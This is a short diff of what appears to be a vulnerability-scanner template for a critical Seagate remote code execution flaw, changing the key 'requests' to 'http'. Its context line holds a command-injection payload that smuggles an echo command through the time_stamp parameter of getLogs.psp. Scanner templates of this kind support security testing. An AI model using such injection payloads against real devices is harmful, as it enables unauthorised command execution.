@@ -6,7 +6,7 @@ info:
   severity: critical
   tags: Seagate,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/getLogs.psp?time_stamp=%3becho%20$((456*654))"
